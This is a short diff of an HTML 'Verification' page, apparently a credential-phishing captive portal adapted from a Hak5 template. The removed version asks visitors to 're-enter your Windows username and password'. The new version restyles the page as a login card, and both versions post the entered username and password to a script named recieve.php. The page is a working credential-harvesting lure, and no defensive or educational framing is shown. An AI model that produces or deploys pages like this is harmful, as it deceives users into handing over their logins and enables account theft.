@@ -1,24 +1,28 @@
-<html>
+<!DOCTYPE html>
+<html >
 <head>
-    <title>Verification</title>
-    <style type="text/css">
-        body {
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Verification</title>
+
+
+  <link rel='stylesheet prefetch' href='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css'>
+
+      <link rel="stylesheet" href="css/style.css">
+
+
 </head>
+
 <body>
-    <h1>Please re-enter your Windows username and password</h1>
-      </form>
+  <div class="login-card">
+    <h1>Verification</h1><br>
+     </form>
                     <form action="recieve.php" method="POST">
-          Username  <input name="Username" type="text" /><br>
-          Password  <input name="Password" type="password" /><br>
-                    <input type="submit" name="submit" value="Validate">
+          Username  <input name="Username" type="text" />
+          Password  <input name="Password" type="password" />
+                    <input type="submit" name="submit" class="login login-submit" value="Validate">
       </form>
+</div>
+
 </body>
 </html>
 
-
-
-
-# Based on portal.html by Hak5 Sebkinne
